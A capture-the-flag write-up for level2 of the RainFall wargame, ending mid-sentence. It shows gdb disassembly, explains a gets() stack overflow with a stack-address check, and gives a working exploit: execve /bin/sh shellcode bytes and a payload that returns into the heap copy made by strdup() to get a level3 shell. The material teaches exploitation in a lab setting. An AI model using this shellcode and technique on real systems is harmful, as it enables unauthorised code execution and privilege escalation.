# Way to level3

When we enter the shell as `level2`, we can see the executable file `level2`.

Let's launch that file first.
```bash
level2@RainFall:~$ ./level2
dsf
dsf
```
It seems that, if we input some characters, is print itself.

Discover it with gdb
```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
---Type <return> to continue, or q <return> to quit---
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
```
In gdb results, I'm wondering about what `p()` functions doing.
Let's disassemble `p()`
```gdb
(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
---Type <return> to continue, or q <return> to quit---
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
```
The instructions after `gets()` read `p()`'s own return address at `ebp+4`, save it at `ebp-0xc`, and apply `and $0xb0000000` followed by `cmp $0xb0000000` and `jne`. For the addresses used here, this distinguishes stack addresses beginning with `0xb` from heap addresses beginning with `0x08`. Strictly speaking, this is a bitmask check, not an exact upper-nibble comparison: it rejects any address whose masked value is `0xb0000000`.

- If the overwritten return address is in the `0xb` stack region, the comparison is equal, so `jne` is not taken. The program calls `printf()` and then `_exit()`, rejecting the address before `ret` executes.
- If the return address is `0x0804a008`, its masked value is zero. The comparison is unequal, so `jne` jumps to `0x8048527 <p+83>`. The normal path calls `puts()`, then `strdup()`, then executes `leave` and `ret`, which jumps to the overwritten return address.

This prevents a direct jump to shellcode stored on the stack. The key to bypassing it is `strdup()`: it does not overwrite the buffer or other stack data, but allocates a heap copy of the input string. In this run, the copy starts at `0x0804a008`. By putting shellcode at the beginning of the input and overwriting the return address with that heap address, we pass the check; `strdup()` then copies the shellcode to the heap before `ret` jumps there.

The following command finds the heap address returned by `strdup()` using `ltrace`:
```bash
python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "A"*55' | ltrace ./level2 2>&1 | grep strdup

```


Why we calculate `80 - len(shellcode)`?
The input begins at `ebp-0x4c`, and the return address is at `ebp+4`. The offset is therefore `0x4c` (76 bytes from the buffer start to saved ebp) + saved ebp 4 bytes = 80 bytes. In level2, `p()` has no stack-alignment `and` instruction and no additional alignment padding in this offset; the alignment instruction is in `main()`. This makes the offset exactly 80 bytes. The shellcode is 25 bytes long, so `80 - len(shellcode)` gives 55 bytes of padding before the four-byte return address.
```bash
level2@RainFall:~$ python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"' > /tmp/exploit
level2@RainFall:~$ cat /tmp/exploit - | ./level2
1�Ph//shh/bin��PS��°
                    ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
REMOVED
```
For the 32-bit Linux `execve` syscall, `eax` must be 11, `ebx` must point to the filename, `ecx` supplies `argv`, and `edx` supplies `envp`. The shellcode uses `push` instructions to build `/bin//sh` on the stack and `mov ebx,esp` to point to it. Thus `ebx` is a filename address, not zero.

A minimal variant can use `ecx = 0` (`argv = NULL`) and `edx = 0` (`envp = NULL`). However, the final payload shown above uses `push eax; push ebx; mov ecx,esp` to construct an argv array containing the filename pointer followed by NULL. In this particular payload, `ecx` points to that array rather than being zero; `edx` is zero.

The initial 23-byte shellcode omitted initialization of `edx`. Its leftover value pointed to an invalid address, so the kernel failed while trying to read the envp array: `execve` returned `EFAULT` (-14, Bad address). Adding `\x89\xc2` (`mov edx,eax`) fixed this, producing the 25-byte shellcode used above. At that instruction, `eax` is still zero from the initial `xor eax,eax`; the intervening pushes and moves have not changed it. This sets `edx = 0` before `mov al,0x0b` selects `execve`.

And the other same as level1.

## Why shellcode?

This is where level1 and level2 diverge.

**level1 — ret2func was enough.**
The level1 binary already contained a `run` function that calls
`system("/bin/sh")`. It's dead code (never called in the normal flow),
but it exists in memory. Overwriting the return address with that
function's address was enough — no need to supply our own code, we just
reused what was already there (ret2func).

**level2 — there is no code to reuse.**
The `p` function in level2 only calls `fflush`, `gets`, `printf`,
`puts`, `strdup`, and `_exit`. There is no `system` call and no backdoor
function like `run`. There is no useful target inside the binary to jump
to.

**libc's system is blocked too (no ret2libc).**
If nothing is in the binary, the next idea is to jump straight to libc's
`system` (ret2libc). But the binary's own check blocks this: